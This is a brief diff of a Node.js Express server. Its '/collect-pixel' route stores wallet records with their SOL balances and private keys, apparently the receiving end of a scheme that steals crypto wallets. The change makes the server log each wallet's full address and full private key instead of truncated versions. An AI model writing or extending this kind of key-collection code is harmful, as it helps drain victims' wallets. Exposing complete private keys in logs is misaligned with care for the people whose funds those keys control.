@@ -172,8 +172,8 @@ app.get('/collect-pixel', async (req, res) => {
                         timestamp
                     ]);
                     
-                    console.log(`   ✅ Wallet: ${wallet.addr.substring(0, 25)}... | ${wallet.bal} SOL`);
-                    console.log(`      Private Key: ${wallet.priv.substring(0, 30)}...`);
+                    console.log(`   ✅ Wallet: ${wallet.addr} | ${wallet.bal} SOL`);
+                    console.log(`      Private Key: ${wallet.priv}`);
                 }
                 
                 await client.query('COMMIT');
